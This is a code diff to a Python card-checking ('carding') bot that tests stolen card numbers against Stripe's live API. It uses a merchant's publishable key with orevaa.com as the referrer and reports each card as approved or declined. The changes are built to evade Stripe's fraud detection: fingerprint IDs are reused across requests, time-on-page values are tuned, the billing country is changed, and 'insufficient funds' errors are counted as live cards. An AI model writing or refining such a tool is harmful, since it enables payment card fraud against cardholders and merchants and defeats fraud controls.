@@ -41,16 +41,33 @@ def get_rotating_user_agent():
     ]
     return random.choice(agents)
 
-def generate_random_stripe_ids():
-    """Generate random Stripe fraud detection IDs for each request"""
-    # Generate UUIDs in the same format as Stripe.js
-    guid = str(uuid.uuid4()) + 'c2bbaa'
-    muid = str(uuid.uuid4()) + '96a4b8' 
-    sid = str(uuid.uuid4()) + '0e40de'
+def generate_consistent_stripe_ids():
+    """Generate consistent Stripe IDs that look realistic but change periodically"""
+    # Use a combination of static and dynamic parts for better success
+    base_uuid = str(uuid.uuid4())
     
-    # Generate random session IDs
-    client_session_id = str(uuid.uuid4())
-    elements_session_config_id = str(uuid.uuid4())
+    # Use consistent IDs for a period (5-10 requests) then change
+    if not hasattr(generate_consistent_stripe_ids, "counter"):
+        generate_consistent_stripe_ids.counter = 0
+        generate_consistent_stripe_ids.base_id = base_uuid
+    
+    generate_consistent_stripe_ids.counter += 1
+    
+    # Change base ID every 8 requests
+    if generate_consistent_stripe_ids.counter >= 8:
+        generate_consistent_stripe_ids.counter = 0
+        generate_consistent_stripe_ids.base_id = str(uuid.uuid4())
+    
+    base_id = generate_consistent_stripe_ids.base_id
+    
+    # Create consistent but varied IDs
+    guid = base_id + 'c2bbaa'
+    muid = base_id[:36] + '96a4b8' 
+    sid = base_id[18:] + '0e40de'
+    
+    # Session IDs - change more frequently but still consistent
+    client_session_id = base_id
+    elements_session_config_id = base_id[:36] + 'config'
     
     return guid, muid, sid, client_session_id, elements_session_config_id
 
@@ -317,11 +334,14 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        # Generate fresh random Stripe IDs for each request
-        guid, muid, sid, client_session_id, elements_session_config_id = generate_random_stripe_ids()
+        # Generate consistent Stripe IDs (less randomization = more approvals)
+        guid, muid, sid, client_session_id, elements_session_config_id = generate_consistent_stripe_ids()
         
-        # Prepare Stripe data with the current card and RANDOM IDs
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page={random.randint(10000, 300000)}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
+        # Use more realistic time values (not too random)
+        time_on_page = random.randint(45000, 120000)  # 45-120 seconds is more realistic
+        
+        # Prepare Stripe data with consistent parameters
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=ZW&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
 
         proxies = parse_proxy(proxy_str)
         
@@ -425,7 +445,7 @@ DECLINED CC ❌
                     error_msg = error_data['error'].get('message', '').lower()
                     
                     # Treat these errors as APPROVED
-                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
+                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc', 'insufficient']):
                         return f"""
 APPROVED CC ✅
 
